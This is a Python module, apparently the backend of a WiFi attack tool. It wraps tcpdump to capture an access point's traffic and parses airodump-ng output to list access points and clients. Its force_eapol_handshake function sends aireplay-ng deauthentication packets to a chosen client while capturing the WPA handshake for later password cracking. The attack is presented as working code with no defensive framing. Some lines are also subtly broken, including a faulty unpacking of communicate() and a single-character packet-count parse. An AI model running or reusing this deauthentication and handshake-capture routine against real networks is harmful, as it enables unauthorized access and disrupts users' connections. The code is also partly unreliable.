from time import sleep
from utils import csv_to_json
from subprocess import Popen, PIPE
import signal
import os

def session_start(ap_mac):
    # Starts capturing all the wifi packets that has communicated with AP using tcpdump
    expression = 'wlan addr1 '+ap_mac+' or wlan addr2 '+ap_mac
    process = Popen(['tcpdump', '-i', 'wlan0', '-l', '-w', 'sample.cap', expression], stdin=PIPE, stdout=PIPE)
    print(process.pid)
    return process.pid

def session_stop(pid):
    # Terminate tcpdump
    os.kill(pid, signal.SIGINT)

def get_ap_list():
    # if os.path.exists('ap-01.csv'):
    #     os.remove('ap-01.csv')
    # # Retrieves AP channel using airodump and output into csv
    # process = Popen(['airodump-ng', 'wlan0', '--output-format', 'csv', '-w', 'ap'], stdin=PIPE, stdout=PIPE)
    # sleep(3)
    # process.send_signal(signal.SIGINT)
    # process.kill()

    # Convert csv to json
    ap_list = csv_to_json('ap-01.csv', 0)
    for i in ap_list:
        i['ESSID'] = i['ESSID'][:-1]
        
    return { 'data': ap_list }

def get_client_list(ap_mac):
    # if os.path.exists('ap_mac-01.csv'):
    #     os.remove('ap_mac-01.csv')
    # # Retrieves list of clients communicating with AP using airodump and output into csv
    # process = Popen(['airodump-ng', 'wlan0', '--bssid', ap_mac, '--output-format', 'csv', '-w', 'ap_mac'], stdin=PIPE, stdout=PIPE)
    # sleep(5) # Time (in seconds) to stop the AP capture
    # process.send_signal(signal.SIGINT)
    # process.kill()

    # Convert csv to json
    client_list = csv_to_json('ap_mac-01.csv', 1)

    return { 'data': client_list }

def force_eapol_handshake(client_mac, ap_mac):
    # Filter and capture EAPOL handshake using tcpdump
    expression = 'ether proto 0x888e and (wlan addr1 '+ap_mac+' or wlan addr1 '+client_mac+')'
    process = Popen(['tcpdump', '-i', 'wlan0', '-l', '-vvv', '-w', 'eapol.cap', expression], stdin=PIPE, stdout=PIPE, stderr=PIPE)

    Popen(['aireplay-ng', '-0', '5', '-a', ap_mac, '-c', client_mac, 'wlan0'], stdin=PIPE, stdout=PIPE, stderr=PIPE)

    sleep(15) # Time (in seconds) to stop the tcpdump
    process.send_signal(signal.SIGINT)
    (), stderr = process.communicate()
    process.kill()

    # Use string of stderr to find the number of packets captured
    stderr = stderr.decode('utf-8').split('\n')[1].split('\r')
    no_eapol_packets = int(stderr[len(stderr) - 1][0])

    print('{} eapol packets captured'.format(no_eapol_packets))
    # Only return success if number of eapol packets > 4
    if no_eapol_packets >= 4:
        return 1
    else:
        return 0